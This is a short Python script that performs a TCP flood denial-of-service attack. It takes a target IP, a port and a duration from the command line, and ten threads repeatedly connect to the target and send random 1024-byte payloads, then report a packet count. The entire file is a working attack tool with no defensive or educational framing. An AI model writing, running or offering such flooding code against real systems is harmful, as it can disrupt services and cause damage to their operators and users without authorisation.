import socket
import random
import threading
import sys
import time

def tcp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    packet_count = 0
    error_count = 0

    def send_packet():
        nonlocal packet_count, error_count
        while time.time() < timeout:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((target_ip, target_port))
                client.send(random._urandom(1024))
                packet_count += 1
                client.close()
            except Exception as e:
                error_count += 1
                break

    threads = []
    for _ in range(10):  # Number of threads
        thread = threading.Thread(target=send_packet)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"TCP flood completed. Total packets sent: {packet_count}")
    if error_count > 0:
        print(f"Total errors encountered: {error_count}")

def main():
    if len(sys.argv) < 4:
        print("Usage: python tcp.py <IP> <PORT> <DURATION>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])

    tcp_flood(target_ip, target_port, duration)

if __name__ == "__main__":
    main()
  
